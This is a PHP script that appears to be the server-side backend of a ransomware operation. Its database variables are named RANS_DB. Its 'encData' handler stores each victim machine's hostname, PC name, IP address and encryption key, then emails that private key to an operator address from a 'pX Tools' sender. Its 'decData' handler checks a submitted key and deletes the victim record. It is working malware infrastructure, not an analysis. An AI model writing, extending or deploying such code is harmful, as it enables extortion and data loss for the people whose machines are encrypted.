<?php
require_once __DIR__ . '/vendor/autoload.php';
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

$servername = $_ENV['DB_HOST'];
$username = $_ENV['RANS_DB_USERNAME'];
$password = $_ENV['DB_PASSWORD'];
$dbname = $_ENV['RANS_DB_NAME'];
$sitename = $_ENV['SITE_NAME'];


$function_name = $_POST['function_name'];

switch ($function_name) {
    case 'encData':
        encData();
        break;
    case 'decData':
        decData();
        break;
    default:
        echo json_encode(array("status" => "error", "msg" => "Invalid function name"));
        break;
}

function encData()
{
    global $servername, $username, $password, $dbname;
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("connection failed: " . $conn->connnect_error);
    }

    $hostname = mysqli_real_escape_string($conn, $_POST['hostname']);
    $pcname = mysqli_real_escape_string($conn, $_POST['pcname']);
    $ip = mysqli_real_escape_string($conn, $_POST['ip']);
    $owner = mysqli_real_escape_string($conn, $_POST['owner']);
    $key = mysqli_real_escape_string($conn, $_POST['key']);
    $start_time = date("Y-m-d H:i:s");

    $sql = "SELECT * FROM clients WHERE hostname='$hostname'";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        echo json_encode(array("status" => "error", "msg" => "already_exist"));
        $conn->close();
        return;
    }

    $sql = "INSERT INTO clients (pcname, hostname, ip_address, key_code, owner, time) 
            VALUES ('$pcname', '$hostname', '$ip', '$key', '$owner', '$start_time')";
    if ($conn->query($sql) === TRUE) {
        echo json_encode(array("status" => "success"));
        mailer($pcname, $ip, $key, $owner);
    } else {
        echo json_encode(array("status" => "error", "msg" => $conn->error));
    }

    $conn->close();
}


function mailer($pcname, $ip, $priv8key, $email){
    global $sitename;
$server = date("D/M/d, Y g:i a");
$sender = '"pX Tools"<support@pxtoolx.com>';
$subj = "New Encryption Key";
$headers .= "From: $sender\n";
$headers .= "X-Priority: 3\n";
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$message = file_get_contents('gosecure.html');
$message = str_replace('$pcname', $pcname, $message);
$message = str_replace('$ip', $ip, $message);
$message = str_replace('$email', $email, $message);
$message = str_replace('$sitename', $sitename, $message);
$message = str_replace('$priv8key', $priv8key, $message);

mail($email, $subj, $message, $headers);

}


function decData()
{
    global $servername, $username, $password, $dbname;
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("connection failed: " . $conn->connnect_error);
    }
    $hostname = mysqli_real_escape_string($conn, $_POST['hostname']);
    $key = mysqli_real_escape_string($conn, $_POST['key']);
    $sql = "SELECT * FROM clients WHERE key_code='$key' AND hostname='$hostname'";
    $result = $conn->query($sql);
    if ($result->num_rows <= 0) {
        echo json_encode(array("status" => "error", "msg" => "Invalid Key"));
        $conn->close();
        return;
    }

    $sql = "DELETE FROM clients WHERE key_code='$key' AND hostname='$hostname'";
    if ($conn->query($sql) === TRUE) {
        echo json_encode(array("status" => "success"));
    } else {
        echo json_encode(array("status" => "error", "msg" => $conn->error));
    }

    $conn->close();
}


?>
